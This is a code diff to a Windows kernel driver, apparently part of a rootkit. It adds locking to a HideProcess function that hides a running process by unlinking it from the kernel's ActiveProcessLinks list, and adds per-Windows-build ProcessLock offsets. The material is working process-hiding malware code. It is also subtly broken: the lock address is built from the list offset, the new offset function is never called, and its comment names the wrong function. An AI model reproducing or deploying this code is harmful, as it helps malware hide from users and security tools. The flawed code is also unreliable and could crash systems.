@@ -12,6 +12,7 @@ bool FindProcess(ULONG pid);
 bool AddProcess(ULONG pid);
 bool RemoveProcess(ULONG pid);
 ULONG GetActiveProcessLinksOffset();
+ULONG GetProcessLock();
 void RemoveProcessLinks(PLIST_ENTRY current);
 UINT64 GetTokenOffset();
 
@@ -77,8 +78,13 @@ NTSTATUS HideProcess(ULONG pid) {
 	PLIST_ENTRY currentList = (PLIST_ENTRY)((ULONG_PTR)currentEProcess + listOffset);
 	PUINT32 currentPid = (PUINT32)((ULONG_PTR)currentEProcess + pidOffset);
 
+	// Using the ActiveProcessLinks lock to avoid accessing problems.
+	PEX_PUSH_LOCK listLock = (PEX_PUSH_LOCK)((ULONG_PTR)currentEProcess + listOffset);
+	ExAcquirePushLockExclusive(listLock);
+
 	if (*(UINT32*)currentPid == pid) {
 		RemoveProcessLinks(currentList);
+		ExReleasePushLockExclusive(listLock);
 		return STATUS_SUCCESS;
 	}
 
@@ -92,6 +98,7 @@ NTSTATUS HideProcess(ULONG pid) {
 	{
 		if (*(UINT32*)currentPid == pid) {
 			RemoveProcessLinks(currentList);
+			ExReleasePushLockExclusive(listLock);
 			return STATUS_SUCCESS;
 		}
 
@@ -100,7 +107,8 @@ NTSTATUS HideProcess(ULONG pid) {
 		currentList = (PLIST_ENTRY)((ULONG_PTR)currentEProcess + listOffset);
 	}
 
-	return STATUS_SUCCESS;
+	ExReleasePushLockExclusive(listLock);
+	return STATUS_UNSUCCESSFUL;
 }
 
 /*
@@ -234,6 +242,46 @@ ULONG GetActiveProcessLinksOffset() {
 	}
 
 	return activeProcessLinks;
+}
+
+
+/*
+* Description:
+* GetActiveProcessLinksOffset is responsible for getting the ProcessLock offset depends on the windows version.
+*
+* Parameters:
+* There are no parameters.
+*
+* Returns:
+* @processLock [ULONG] -- Offset of ProcessLock.
+*/
+ULONG GetProcessLock() {
+	ULONG processLock = (ULONG)STATUS_UNSUCCESSFUL;
+	RTL_OSVERSIONINFOW osVersion = { sizeof(osVersion) };
+	NTSTATUS result = RtlGetVersion(&osVersion);
+
+	if (NT_SUCCESS(result)) {
+		switch (osVersion.dwBuildNumber) {
+		case WIN_1507:
+		case WIN_1511:
+		case WIN_1607:
+		case WIN_1703:
+		case WIN_1709:
+		case WIN_1803:
+		case WIN_1809:
+			processLock = 0x2d8;
+			break;
+		case WIN_1903:
+		case WIN_1909:
+			processLock = 0x2e0;
+			break;
+		default:
+			processLock = 0x438;
+			break;
+		}
+	}
+
+	return processLock;
 }
 
 /*
